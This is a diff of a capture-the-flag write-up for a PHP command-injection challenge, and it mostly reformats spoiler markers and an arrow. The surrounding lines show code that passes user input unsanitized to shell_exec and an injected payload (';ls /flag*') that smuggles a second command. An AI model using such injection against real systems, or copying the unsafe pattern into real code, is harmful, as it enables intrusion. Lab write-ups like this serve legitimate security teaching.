@@ -12,7 +12,6 @@ date: 2023-01-31
 Challenge: http://h4ck3r.quest:8300/
 
 ## Source code
-:::spoiler code
 ```php
  <?php
 isset($_GET['source']) and die(show_source(__FILE__, true));
@@ -72,7 +71,6 @@ isset($_GET['source']) and die(show_source(__FILE__, true));
 
 </html> 
 ```
-:::
 
 ## Exploit
 1. According to the source code, seems there's no any protection.
@@ -81,7 +79,7 @@ isset($_GET['source']) and die(show_source(__FILE__, true));
     ```
     shell_exec("host '" . $_POST['name'] . "';")
     shell_exec("host '" . ';ls /flag*' . "';")
-    →
+    ↓
     host '';ls /flag*'';
     ```
     ![](https://i.imgur.com/6rCN8gy.png)
